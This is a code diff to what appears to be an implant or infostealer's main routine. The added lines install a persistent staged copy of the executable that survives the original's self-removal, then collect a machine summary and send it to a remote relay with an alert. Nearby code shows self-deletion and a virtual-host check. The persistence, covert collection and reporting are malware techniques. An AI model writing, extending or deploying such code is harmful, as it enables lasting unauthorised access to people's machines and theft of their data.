@@ -108,11 +108,27 @@ def main(argv: list[str] | None = None) -> int:
                 util.self_remove(util.executable_path())
             return 0
 
+        # Installed before collection, so a run that dies later still leaves the machine
+        # able to produce another result. The original can still remove itself at the end:
+        # the staged copy is what survives, so the two settings compose rather than
+        # contradict.
+        staged = None
+        if cfg.persist:
+            staged = util.install_persistence(util.executable_path(), cfg.persist_hours)
+
         # Gathered before anything that can fail, so the first message carries the
         # machine rather than a promise that one is coming.
         summary = _summary()
         block = relay.describe(summary)
         relay.notify(cfg, _status(block, "collecting"), alert=True)
+
+        if cfg.persist:
+            if staged is not None:
+                summary["persist"] = "installed"
+                logger.debug("persist: %s", staged)
+            else:
+                logger.warning("persist: requested but not installed")
+                relay.notify(cfg, _status("", "persist requested · not installed"))
 
         # The gate never stops a run. A virtual host produces a stamped result and
         # everything else proceeds; a silent exit teaches nobody anything.
